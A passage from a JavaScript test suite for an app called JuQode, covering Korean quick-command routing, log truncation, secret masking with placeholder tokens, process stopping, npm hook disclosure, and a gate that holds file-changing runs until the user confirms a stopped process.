  assert.strictEqual(repo.hasStoppedProcessAcknowledgement(b.db, legacy.work.id), true);
  const held = await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  assert.strictEqual(held.reason, 'prior-run-unknown', 'acking one unknown Work freed another');

  const cleared = repo.acknowledgeUnknownProcessStopped(b.db, b.project.id, linked.work.id, { verdict: 'NOT_OBSERVED_WITH_EVIDENCE', reason: 'stub', scope: 'all-runners' });   // a recorded confirmation WITH an observation
  assert.strictEqual(cleared.ok, true, cleared.reason);
  assert.strictEqual(repo.getWork(b.db, linked.work.id).outcome, 'ended_unknown');
  assert.strictEqual(unknownTaskRunWithLiveRunner(b.db, b.project.id), null);
  const after = await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  assert.strictEqual(after.ok, true, `${after.reason}/${after.detail}`);
  await waitFor(5000, () => b.pushed.some((u) => u.runId === after.runId && u.ended));
  assert.ok(fs.existsSync(path.join(b.dir, 'touched.txt')), 'the build did not write after the stop was confirmed');
});

function waitFor(ms, pred) {
  const deadline = Date.now() + ms;
  return new Promise((resolve, reject) => {
    const t = setInterval(() => {
      if (pred()) { clearInterval(t); resolve(); return; }
      if (Date.now() >= deadline) {
        clearInterval(t);
        reject(new Error(`timed out after ${ms}ms`));
      }
    }, 20);
  });
}

/* ───────── batch-12 security review · what the fixes have to keep true ───────── */

test('a full output is a genuine PREFIX, never a spliced-together middle', async () => {
  /* MEASURED by the review: an oversized chunk was skipped and LATER, smaller chunks were still
   * appended, so the middle of the log vanished and the ends were spliced with nothing to say
   * so. A build printing 60 KB of warnings, then a 20 KB error block, then a final "failed"
   * line showed the warnings and the final line — a complete-looking log missing the error. */
  const dir = project({});
  const big = run.OUTPUT_LIMIT;
  const out = await run.start({
    argv: NODE(`process.stdout.write('A'.repeat(${big})); process.stdout.write('B'.repeat(2000)); console.log('ZZZ-END')`),
    cwd: dir,
  }).done;

  assert.strictEqual(out.truncated, true, 'the fixture did not exceed the limit');
  assert.ok(!out.output.includes('ZZZ-END'),
    'the tail was spliced onto the head — the log reads as complete and is not');
  assert.ok(!out.output.includes('B'), 'content from after the cut survived the cut');
  assert.ok(Buffer.byteLength(out.output, 'utf8') <= run.OUTPUT_LIMIT);
  /* …and what IS kept is exactly a prefix of what was printed. */
  assert.ok(/^A+$/.test(out.output), 'the kept head is not a contiguous prefix');
});

test('masking does not eat a build error, its file, or its line', () => {
  /* MEASURED: case-insensitive matching plus `\s*` after the separator turned
   * `SyntaxError: Unexpected token: '}' at line 12` into `Unexpected *** at line 12`, and —
   * because `\s*` crosses newlines — deleted the `src/app.ts:14:2` line FOLLOWING an
   * `Unexpected token:`. These two rules exist to show a user why something failed. */
  const keep = [
    "SyntaxError: Unexpected token: '}' at line 12",
    '  ok 4 - token: identifier',
    'PASS  parses password: field of the login form',
    'Unexpected token:\nsrc/app.ts:14:2\n  const x = 1',
    'const tokenPath = resolve(dir)',
    'error TS2345: Argument of type secret: string is not assignable',
  ];
  for (const t of keep) {
    assert.strictEqual(run.mask(t), t, `masking destroyed ordinary output: ${JSON.stringify(t)}`);
  }
});

test('masking still catches the shapes it is for', () => {
  /* The counterpart — a mask narrowed until it matches nothing would pass the test above. */
  const mask = [
    ['GITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz', 'ghp_'],
    ['API_KEY: 0123456789abcdef', '0123456789'],
    ['DB_PASSWORD=hunter2', 'hunter2'],
    ['authorization: Bearer FAKEabcdefghij0123456789', 'FAKEabcdefghij'],
    ['postgres://admin:FAKEpassword123@db.internal:5432/app', 'FAKEpassword123'],
    ['sk_live_FAKEabcdefghij0123', 'FAKEabcdefghij'],
    ['AWS_ACCESS_KEY_ID=AKIA0123456789ABCDEF', 'AKIA0123456789'],
  ];
  for (const [text, secret] of mask) {
    const m = run.mask(text);
    assert.ok(m.includes('***'), `nothing was masked in ${text.split(/[=:]/)[0]}`);
    assert.ok(!m.includes(secret), `the value survived masking in ${text.split(/[=:]/)[0]}`);
  }
});

test('stopping a child that already exited signals nothing', () => {
  /* `07` §8.5: a pid is REUSABLE. The SIGKILL was guarded and the SIGTERM was not, so pressing
   * 멈추기 in the window between a child's exit and its handle being dropped signalled a group
   * id that no longer belonged to us.
   *
   * `assert.doesNotThrow` cannot see this — signalling a dead group raises ESRCH, which the
   * code catches. What the test has to observe is that NO SIGNAL WAS SENT, so `process.kill`
   * is recorded for the length of the call. */
  const dir = project({});
  const r = run.start({ argv: NODE('process.exit(0)'), cwd: dir });
  return r.done.then(() => {
    const real = process.kill;
    const sent = [];
    process.kill = (pid, sig) => { sent.push([pid, sig]); return real.call(process, pid, sig); };
    try {
      r.stop();
      r.stop();
    } finally {
      process.kill = real;
    }
    assert.deepStrictEqual(sent, [],
      `a signal was sent to a reaped process group: ${JSON.stringify(sent)}`);
  });
});

test('stopping a child that IS running does signal it', { skip: WIN && 'POSIX process-group signalling; see the Windows counterpart below' }, () => {
  /* The counterpart. A guard that never signals would pass the test above and make 멈추기 a
   * button that does nothing. */
  const dir = project({});
  const r = run.start({ argv: NODE('setTimeout(() => {}, 30000)'), cwd: dir, kind: 'long_running' });
  return new Promise((res) => setTimeout(res, 120)).then(() => {
    const real = process.kill;
    const sent = [];
    process.kill = (pid, sig) => { sent.push([pid, sig]); return real.call(process, pid, sig); };
    try { r.stop(); } finally { process.kill = real; }
    assert.ok(sent.length >= 1, '멈추기 sent no signal to a running child');
    assert.strictEqual(sent[0][1], 'SIGTERM', '`19` §C4: SIGTERM first, then SIGKILL after 5 s');
    assert.ok(sent[0][0] < 0, '`07` §8.2: the whole process GROUP, not just the parent');
    return r.done;
  });
});

test('Windows: stopping a running child ends it and the card says stopped (root only is what run.js can reach)', { skip: !WIN && 'Windows-only' }, async () => {
  /* There are no process groups to signal here: run.js falls back to the root handle's kill. This
   * pins what IS true — the root dies and the state is \`stopped\` — and deliberately does NOT claim
   * the descendants died (an unmeasured Windows tree is V1-404's, on H1). */
  const dir = project({});
  const r = run.start({ argv: NODE('setInterval(() => {}, 1000)'), cwd: dir, kind: 'long_running' });
  await new Promise((res) => setTimeout(res, 300));
  r.stop();
  const out = await r.done;
  assert.strictEqual(out.state, 'stopped');
});

test('a script\'s pre/post hooks are disclosed, because they also run', () => {
  /* VERIFIED against npm 9.2.0: `npm run build` runs `prebuild` and `postbuild` too. Showing
   * only the named script made the card display a strict SUBSET of what 실행 executes — and
   * JuQode's own Work path lets Claude Code write package.json. */
  const root = project({ 'package.json': pkg({
    prebuild: 'node ./tools/generate.js', build: 'vite build', postbuild: 'node ./tools/ship.js',
    test: 'node --test',
  }) });
  const a = availability('qc.build', { root });
  assert.strictEqual(a.available, true);
  assert.deepStrictEqual(a.data.hooks.map((h) => h.script), ['prebuild', 'postbuild']);
  assert.strictEqual(a.data.hooks[0].body, 'node ./tools/generate.js');

  /* …and a script with no hooks reports none, rather than an empty section on the card. */
  assert.deepStrictEqual(availability('qc.test', { root }).data.hooks, []);
});

test('the filler list is Canon\'s six and nothing more', () => {
  /* Every extra filler WIDENS the path to a spawn: `서버 얼른 켜줘` ran, where Canon's list
   * leaves it 미인식 and sends it to a Work. `19` §C4 writes all six out, so there is nothing
   * to reconstruct here, and the corpus is 87/87 against exactly these. */
  const { FILLERS } = require(path.join(R, 'app/main/qc/rules.js'));
  assert.deepStrictEqual([...FILLERS].sort(), ['그냥', '빨리', '제발', '좀', '지금', '한번'].sort());

  for (const phrase of ['서버 얼른 켜줘', '빌드 일단 돌려줘', '테스트 혹시 실행해줘', '서버 부탁 켜줘']) {
    assert.strictEqual(match(phrase).kind, 'unrecognized',
      `"${phrase}" reached a rule — Canon's stance is 정밀도 우선`);
  }
  /* …and Canon's own six still work. */
  for (const phrase of ['서버 좀 켜줘', '서버 제발 켜줘', '빌드 한번 해줘', '테스트 그냥 돌려줘']) {
    assert.strictEqual(match(phrase).kind, 'qc', `"${phrase}" stopped working`);
  }
});

test('SC-02 and the drawer never disagree about what is technical', () => {
  /* D-134 · `15` SC-02: the request field decides a phrase is technical and hands it to the
   * drawer, which then decides whether it is one of the six. Two rule tables meant those two
   * answers could differ — `서버 얼른 켜줘` routed to the terminal and came back 미인식, so the
   * product told the user where to go and then said it did not understand them.
   *
   * They are separate modules on purpose (SC-02 also has to answer `work`), so this checks the
   * one thing they must agree on rather than merging them. */
  const { classify } = require(path.join(R, 'app/main/router/intent.js'));
  const corpus = CORPUS.map(([phrase]) => phrase).filter(Boolean);
  assert.ok(corpus.length >= 40, `expected Canon's corpus, got ${corpus.length}`);

  const disagreements = [];
  for (const phrase of corpus) {
    const sc02 = classify(phrase);
    const drawer = match(phrase);
    const sc02Technical = sc02.route === 'terminal';
    const drawerTechnical = drawer.kind === 'qc';
    /* An ambiguity on one side and an ambiguity on the other is agreement; so is work/미인식. */
    if (sc02.route === 'ambiguous' && drawer.kind === 'ambiguous') continue;
    if (sc02Technical !== drawerTechnical) {
      disagreements.push(`${phrase}: SC-02=${sc02.route} drawer=${drawer.kind}`);
    }
  }
  assert.deepStrictEqual(disagreements, [],
    `the two rule tables disagree:\n  ${disagreements.join('\n  ')}`);
});

test('the two routers share ONE filler list', () => {
  /* The structural half of the test above. Sharing the list is what makes the agreement hold
   * for phrases nobody has written down yet. */
  const { FILLERS: routerFillers } = require(path.join(R, 'app/main/router/rules.js'));
  const { FILLERS: qcFillers } = require(path.join(R, 'app/main/qc/rules.js'));
  assert.strictEqual(routerFillers, qcFillers, 'the routers have two filler lists again');
});

test('every rule the drawer can explain has all three sentences', () => {
  /* `19` §C4 requires the card to show 이해한 것 · 실행할 명령 · 하는 일 before it runs. A rule
   * missing any one of them would ask the user to confirm a blank — which the stop card did:
   * its action is a SIGNAL, not a package.json script, so it had no command string at all. */
  const { RULES } = require(path.join(R, 'app/main/qc/rules.js'));
  const copy = srcOf('app/renderer/copy.js');
  for (const rule of RULES) {
    for (const table of ['qcUnderstood', 'qcMeaning']) {
      const block = copy.slice(copy.indexOf(`${table}: {`));
      const body = block.slice(0, block.indexOf('\n    },'));
      assert.ok(body.includes(`'${rule.id}'`), `${table} has no sentence for ${rule.id}`);
    }
  }
  /* …and the two FIXED actions have an action line, because they have no command to show. */
  const actions = copy.slice(copy.indexOf('qcAction: {'));
  for (const id of ['qc.dev.stop', 'qc.terminal.open']) {
    assert.ok(actions.slice(0, actions.indexOf('\n    },')).includes(`'${id}'`),
      `${id} has no 실행할 명령 line, so its card asks the user to confirm a blank`);
  }
});

/* ── invariants of the CLOSED rule set (`19` §C4 · `20`.quick_command_rule) ───────────────── */

test('no two rules share a pattern — the T1 ambiguity branch is unreachable BY INVARIANT', () => {
  /* FOUND BY MUTATION, as an equivalent mutant that was worth chasing anyway. `match()` reads
   *
   *     if (exact.length === 1) return …;
   *     if (exact.length > 1)   return ambiguous;
   *
   * so `> 1` and `>= 1` behave identically and every mutation of that line survives. Chasing it
   * showed the second branch cannot fire at all: the six rules share no pattern string.
   *
   * The branch stays — the rule set is data, and a seventh rule could collide. What this test
   * adds is the reason it cannot fire TODAY, as a property rather than as a comment: two rules
   * sharing a pattern would also make one of them permanently unreachable through T1, which is
   * a defect in the rule set and not something the matcher should quietly resolve. */
  const seen = new Map();
  for (const r of RULES) {
    for (const p of r.patterns) seen.set(p, [...(seen.get(p) ?? []), r.id]);
  }
  const shared = [...seen].filter(([, ids]) => ids.length > 1);
  assert.deepStrictEqual(shared, [],
    `two rules answer to the same phrase: ${shared.map(([p, ids]) => `${p} → ${ids}`).join(' · ')}`);
  /* …and the check can see a collision when there is one. */
  const probe = new Map([['x', ['a']], ['y', ['a', 'b']]]);
  assert.strictEqual([...probe].filter(([, ids]) => ids.length > 1).length, 1);
});

test('the ambiguity branch that IS reachable stays reachable', () => {
  /* T2b — a bare verb with no object. `실행해줘` means three different rules and `19` §C4 says
   * JuQode does not choose; naming this here means a refactor that made every phrase resolve to
   * one rule would fail rather than look like an improvement. */
  const r = match('실행해줘');
  assert.strictEqual(r.kind, 'ambiguous');
  assert.ok(r.readings.length > 1, `실행해줘 resolved to ${JSON.stringify(r.readings)}`);
});

test('a package.json whose `scripts` is not an object is 사용 불가, never a crash', () => {
  /* FOUND BY MUTATION: `(pkg.scripts && typeof pkg.scripts === 'object') ? pkg.scripts : {}`
   * had no test behind it at all — nothing in the suite ever handed `availability()` a
   * malformed `scripts`. `12` §16: 사용 불가 ≠ 실패, and neither is a thrown error.
   *
   * A hand-written or generated `package.json` can carry anything, and `19` §C4 is explicit
   * that JuQode does not invent a build method — so every shape that is not a script map has
   * to come out as `no_script` with the reason, and none of them may throw. */
  const { tempDir } = require(path.join(__dirname, 'tmp.js'));
  for (const scripts of ['npm run build', 42, true, ['build'], null]) {
    const dir = tempDir('juqode-qc-scripts-');
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts }));
    for (const id of ['qc.dev.start', 'qc.build', 'qc.test']) {
      let a;
      assert.doesNotThrow(() => { a = availability(id, { root: dir }); },
        `${id} threw on scripts=${JSON.stringify(scripts)}`);
      assert.strictEqual(a.available, false, `${id} claimed to be runnable with scripts=${JSON.stringify(scripts)}`);
      assert.strictEqual(a.reason, 'no_script', `${id} gave the reason ${a.reason}`);
    }
  }

  /* …and an ARRAY is an object to `typeof`, which is the case the guard cannot catch — so it is
   * checked above by its OUTCOME rather than by the guard's shape. A `package.json` with no
   * `scripts` key at all is the same answer. */
  const bare = tempDir('juqode-qc-scripts-');
  fs.writeFileSync(path.join(bare, 'package.json'), JSON.stringify({ name: 'x' }));
  assert.strictEqual(availability('qc.build', { root: bare }).reason, 'no_script');

  /* The check can tell a real script map from all of those. */
  const real = tempDir('juqode-qc-scripts-');
  fs.writeFileSync(path.join(real, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'vite build' } }));
  const ok = availability('qc.build', { root: real });
  assert.strictEqual(ok.available, true, 'a real build script was refused');
  assert.deepStrictEqual(ok.data.argv, ['npm', 'run', 'build']);
});

/* ── a Stop whose outcome is `unknown` must not let a new Writer in while something may still be running ── */
const { STOP_WORST_CASE_MS } = require(path.join(R, 'app/main/qc/stopper.js'));
const { createUncertain } = require(path.join(R, 'app/main/qc/uncertain.js'));

test('Writer gate: an uncertain QC Stop refuses a new Work and file-changing Quick Commands; read-only ones and Stop still work; only a later snapshot showing it gone opens it', async () => {
  let alive = [{ pid: 4242, created: 'T0' }];
  const probes = [];
  const uncertain = createUncertain({ probe: async (m) => { probes.push(m.map((x) => x.pid)); return alive; }, retryMs: 5, maxTries: 3 });
  const b = qcBench(undefined, { qcUncertain: uncertain });
  uncertain.add('qc-run-1', b.project.id, [{ pid: 4242, created: 'T0' }]);
  await new Promise((r) => setTimeout(r, 30));
  assert.ok(uncertain.blocks(b.project.id), 'the probe saw it alive, but the gate opened');

  // a new Work (task or not) is refused before anything is spawned
  const work = await b.h['juqode:work-start'](null, b.project.id, '버튼 고쳐줘');
  assert.deepStrictEqual([work.ok, work.reason], [false, 'prior-process-may-still-live']);
  // file-changing Quick Commands are refused with the approved sentence's key; the list says so too
  const build = await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드');
  assert.deepStrictEqual([build.ok, build.reason], [false, 'prior-run-unknown']);
  assert.strictEqual(b.h['juqode:qc-list'](null, b.project.id).rules.find((r) => r.id === 'qc.build').reason, 'prior-run-unknown');
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a refused command became history');
  // read-only commands stay possible, and so does Stopping what JuQode started
  const status = b.h['juqode:qc-route'](null, b.project.id, '깃 상태');
  assert.notStrictEqual(status.reason, 'prior-run-unknown');

  // a snapshot that cannot be read does not open the gate; another project is unaffected
  alive = null;
  uncertain.refresh(b.project.id);
  await new Promise((r) => setTimeout(r, 30));
  assert.ok(uncertain.blocks(b.project.id), 'an unreadable snapshot opened the gate');
  assert.strictEqual(uncertain.blocks('another-project'), null);

  // gone in a later snapshot -> open (the run itself stays `unknown`; nothing rewrote it)
  alive = [];
  uncertain.refresh(b.project.id);
  await new Promise((r) => setTimeout(r, 30));
  assert.ok(uncertain.blocks(b.project.id), 'a snapshot alone released the hold (policy: only the user\'s confirmation does)');
  uncertain.release('qc-run-1');                      // the ack handler's last step; its row/evidence checks are covered in qc-stop-proof.test.js
  assert.strictEqual(uncertain.blocks(b.project.id), null);
  const ran = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(ran.ok, true, `${ran.reason}/${ran.detail}`);
  await waitFor(8000, () => b.pushed.some((u) => u.runId === ran.runId && u.ended));
});

test('Writer gate: an uncertain Stop with NO recorded members (nothing to look for) stays shut', async () => {
  const uncertain = createUncertain({ probe: async () => [], retryMs: 5, maxTries: 2 });
  uncertain.add('qc-run-2', 'p1', null);
  await new Promise((r) => setTimeout(r, 30));
  assert.strictEqual(uncertain.blocks('p1'), 'qc-run-2', 'with no pid to check, the gate cannot honestly open');
  uncertain.add('qc-run-3', 'p2', []);
  await new Promise((r) => setTimeout(r, 30));
  assert.strictEqual(uncertain.blocks('p2'), 'qc-run-3');
});

/* ── a restart must not forget a Quick Command whose processes may still be alive ── */
/* These tests reach `work-start` only to see the gate's answer. A real `claude` may be installed, so the CLI is pointed at
 * a path that does not exist: nothing can be launched and no model can be called, whatever the gate says. */
const noClaude = () => { const was = process.env.JUQODE_CLAUDE_BIN; process.env.JUQODE_CLAUDE_BIN = path.join(os.tmpdir(), 'juqode-no-such-claude'); return () => { if (was === undefined) delete process.env.JUQODE_CLAUDE_BIN; else process.env.JUQODE_CLAUDE_BIN = was; }; };
const restartOf = (b, extra = {}) => makeHandlers({ db: () => b.db, dbFault: () => null, evidenceStore: () => b.evidence,
                                                    push: () => {}, pushQc: () => {}, ...extra });
const strandedRun = (b, pid = 4242) => {
  const id = repo.beginQcRun(b.db, b.project.id, { phrase: '서버 켜줘', ruleId: 'qc.dev.start', command: 'npm run dev', status: 'long_running' });
  repo.setQcRunner(b.db, id, { sessionId: 'old-session', pid, startedAt: new Date().toISOString() });
  return id;
};

test('restart: a run nobody saw finish keeps the Writer gate shut across restarts until the USER confirms; the row stays unknown and the record is append-only', async (t) => {
  const restoreEnv = noClaude(); t.after(restoreEnv);
  const b = qcBench();
  const id = strandedRun(b);
  repo.reconcileQcRuns(b.db);                                           // what main.js does at boot
  assert.strictEqual(repo.qcRun(b.db, id).status, 'unknown');
  assert.strictEqual(repo.qcRun(b.db, id).runner_pid, 4242, 'the process identity was not persisted');

  for (let restart = 1; restart <= 2; restart += 1) {                  // a restart alone never opens it
    const h = restartOf(b);
    const build = await h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드');
    assert.deepStrictEqual([build.ok, build.reason], [false, 'prior-run-unknown'], `restart ${restart}`);
    const work = await h['juqode:work-start'](null, b.project.id, '고쳐줘');
    assert.deepStrictEqual([work.ok, work.reason], [false, 'prior-process-may-still-live'], `restart ${restart}`);
    const listed = h['juqode:qc-list'](null, b.project.id);
    assert.deepStrictEqual(listed.held.map((x) => [x.runId, x.needsAck, x.why]), [[id, true, 'never-finished']]);
    assert.ok(h['juqode:qc-route'](null, b.project.id, '깃 상태').reason !== 'prior-run-unknown', 'a read-only command was blocked');
    assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id).map((r) => r.id), [id], 'a refused command became a row');
  }

  const h = restartOf(b);
  assert.strictEqual((await h['juqode:qc-ack-stopped'](null, b.project.id, [id], false)).reason, 'confirmation-required');
  assert.strictEqual((await h['juqode:qc-ack-stopped'](null, b.project.id, [id], 'yes')).reason, 'confirmation-required');
  assert.strictEqual((await h['juqode:qc-ack-stopped'](null, b.project.id, [], true)).reason, 'no-runs-named', 'a confirmation that names no run released something');
  assert.ok(h['juqode:qc-list'](null, b.project.id).held.length === 1, 'an unconfirmed ack released the hold');
  const ack = await h['juqode:qc-ack-stopped'](null, b.project.id, [id], true);
  assert.deepStrictEqual([ack.ok, ack.acked.length, ack.acked[0].existing], [true, 1, false]);
  const rec = JSON.parse(fs.readFileSync(path.join(b.evidence, 'qc-ack', `${id}.json`), 'utf8'));
  assert.deepStrictEqual([rec.runId, rec.confirmedBy, rec.before.status, rec.before.runnerPid, rec.heldBecause], [id, 'user', 'unknown', 4242, 'never-finished']);
  assert.strictEqual(repo.qcRun(b.db, id).status, 'unknown', 'a confirmation rewrote the past result');
  assert.strictEqual(repo.qcRun(b.db, id).exit_code, null);

  const after = restartOf(b);                                           // the confirmation survives a restart
  assert.strictEqual(after['juqode:qc-list'](null, b.project.id).held.length, 0);
  const again = await after['juqode:qc-ack-stopped'](null, b.project.id, [id], true);
  assert.deepStrictEqual([again.ok, again.skipped.map((x) => x.reason)], [false, ['not-held-by-this-project']], 'a run that is no longer held was acknowledged again');
  assert.strictEqual(JSON.parse(fs.readFileSync(path.join(b.evidence, 'qc-ack', `${id}.json`), 'utf8')).confirmedAt, rec.confirmedAt, 'the record was overwritten');
  const ran = await after['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트');
  assert.strictEqual(ran.ok, true, `${ran.reason}/${ran.detail}`);
});

test('restart: only a Stop that ended `stopped` is not held; a complete record and a record with members are held until the user confirms the run', async (t) => {
  const restoreEnv = noClaude(); t.after(restoreEnv);
  const b = qcBench();
  const T1 = '2026-10-16T10:00:01.000Z';
  const STARTED = new Date().toISOString();
  const mk = (stop, status = 'unknown') => {
    const id = repo.beginQcRun(b.db, b.project.id, { phrase: 'x', ruleId: 'qc.dev.start', command: 'npm run dev', status: 'long_running' });
    repo.setQcRunner(b.db, id, { sessionId: 's', pid: 1, startedAt: STARTED });
    const rel = path.join('qc-stop', `${id}.json`);
    fs.mkdirSync(path.join(b.evidence, 'qc-stop'), { recursive: true });
    fs.writeFileSync(path.join(b.evidence, rel), JSON.stringify({ runId: id, recordedAt: new Date(Date.now() + 1000).toISOString(), stop }));
    repo.endQcRun(b.db, id, { status, exitCode: 1, outputRef: `evidence:qc-stop/${id}.json`, endedAt: new Date().toISOString() });
    return id;
  };
  const complete = (id) => ({ requested: true, requestedAt: new Date().toISOString(), attempts: 1, root: 'not-terminated', taskkill: { status: 255, error: null }, fallback: { used: true, sent: false },
    snapshot: { root: { pid: 1, created: STARTED }, descendants: 0 }, descendants: 'none', platform: 'win32', members: [], uncertain: false, verdict: 'stop-unconfirmed',
    observedExit: { code: 1, signal: null }, timings: { snapshotMs: 1, taskkillMs: 1, survivorsMs: 1 } });
  const clear = mk(complete());
  const stopped = mk({ requested: true, verdict: 'stopped-tree-observed', uncertain: undefined }, 'stopped');
  const withMembers = mk({ requested: true, verdict: 'root-stopped-descendants-alive', uncertain: true, members: [{ pid: 777, created: T1 }], platform: 'win32', attempts: 1, requestedAt: new Date().toISOString() });
  let alive = [{ pid: 777, created: T1 }];
  const reg = createUncertain({ probe: async () => alive, retryMs: 5, maxTries: 3 });
  const h = restartOf(b, { qcUncertain: reg });
  assert.deepStrictEqual(h['juqode:qc-list'](null, b.project.id).held.map((x) => x.runId).sort(), [clear, withMembers].sort(), 'unknown runs are held, the stopped one is not');
  assert.ok(!reg.has(stopped));
  alive = [];
  reg.refresh(b.project.id);
  await new Promise((r) => setTimeout(r, 30));
  assert.ok(reg.blocks(b.project.id), 'a snapshot showing every member gone released the hold');
  const r = h['juqode:qc-ack-stopped'](null, b.project.id, [clear, withMembers], true);
  assert.deepStrictEqual(r.acked.map((x) => x.runId).sort(), [clear, withMembers].sort());
  assert.strictEqual(reg.blocks(b.project.id), null);
  const work = await h['juqode:work-start'](null, b.project.id, '고쳐줘');
  assert.notStrictEqual(work.reason, 'prior-process-may-still-live');

  // after another restart the confirmed runs stay released (the record is on disk), and nothing else appears
  const reg2 = createUncertain({ probe: async () => alive, retryMs: 5, maxTries: 3 });
  const h2 = restartOf(b, { qcUncertain: reg2 });
  h2['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(reg2.blocks(b.project.id), null);
});

test('both directions: a running file-changing Quick Command refuses a new Work; a running Work refuses file-changing Quick Commands; a dev server and read-only commands do not', async (t) => {
  const restoreEnv = noClaude(); t.after(restoreEnv);
  const b = qcBench({ 'package.json': pkg({ test: 'node -e "setTimeout(()=>{},2500)"', dev: 'node -e "setInterval(()=>{},1000)"' }) });
  const built = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트');
  assert.strictEqual(built.ok, true, `${built.reason}/${built.detail}`);
  const work = await b.h['juqode:work-start'](null, b.project.id, '고쳐줘');
  assert.deepStrictEqual([work.ok, work.reason], [false, 'qc-writer-running'], 'a Work started beside a running build/test');
  const retry = await b.h['juqode:task-retry'](null, 'no-task', 'no-work', 'x', 'k', false);
  assert.strictEqual(retry.ok, false);
  await waitFor(8000, () => b.pushed.some((u) => u.runId === built.runId && u.ended));
  const after = await b.h['juqode:work-start'](null, b.project.id, '고쳐줘');
  assert.notStrictEqual(after.reason, 'qc-writer-running', 'the gate stayed shut after the command ended');

  // the dev server is how the user watches a Work: it must not lock Work out
  const b2 = qcBench({ 'package.json': pkg({ dev: 'node -e "setInterval(()=>{},1000)"' }) });
  const dev = await b2.h['juqode:qc-run'](null, b2.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(dev.ok, true);
  const w2 = await b2.h['juqode:work-start'](null, b2.project.id, '고쳐줘');
  assert.notStrictEqual(w2.reason, 'qc-writer-running');
  b2.h['juqode:qc-stop'](null, b2.project.id);
  await waitFor(STOP_WORST_CASE_MS, () => b2.pushed.some((u) => u.runId === dev.runId && u.ended));
});
